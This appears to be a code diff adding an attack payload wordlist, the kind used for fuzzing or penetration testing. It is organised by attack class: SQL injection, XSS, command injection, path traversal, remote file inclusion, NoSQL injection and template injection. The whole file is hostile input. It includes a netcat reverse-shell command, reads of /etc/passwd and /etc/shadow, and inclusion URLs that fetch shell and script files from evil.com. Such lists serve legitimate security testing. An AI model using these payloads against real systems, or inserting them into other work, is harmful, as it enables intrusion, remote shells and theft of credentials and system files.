@@ -1,0 +1,59 @@
+# --- SQL Injection (SQLi) ---
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' UNION SELECT NULL,NULL,NULL--
+'--
+' OR 'a'='a
+' OR TRUE--
+') OR ('1'='1
+"; EXEC(char(0x73716c69))--
+
+# --- Cross-Site Scripting (XSS) ---
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+'"><script>alert(1)</script>
+<details open ontoggle=alert(1)>
+<video><source onerror="alert(1)">
+<iframe src="javascript:alert(1)">
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+
+# --- Command Injection (RCE) ---
+;whoami
+;id;ls -la
+|whoami
+&whoami
+`whoami`
+$(whoami)
+;cat /etc/passwd
+;nc -e /bin/sh 127.0.0.1 4444
+;python -c 'import os;os.system("ls")'
+|| id
+
+# --- Path Traversal / LFI ---
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+/etc/passwd
+../../../../var/log/apache2/access.log
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+../../../../boot.ini
+../../../../etc/shadow
+/proc/self/environ
+
+# --- Remote File Inclusion (RFI) ---
+http://evil.com/shell.txt
+https://raw.githubusercontent.com/payloads/exploit.js
+//evil.com/xss.js
+ftp://anonymous@evil.com/malicious.py
+
+# --- NoSQL Injection & Server-Side Template Injection (SSTI) ---
+{"$gt": ""}
+$where: "1 == 1"
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+{{config.items()}}
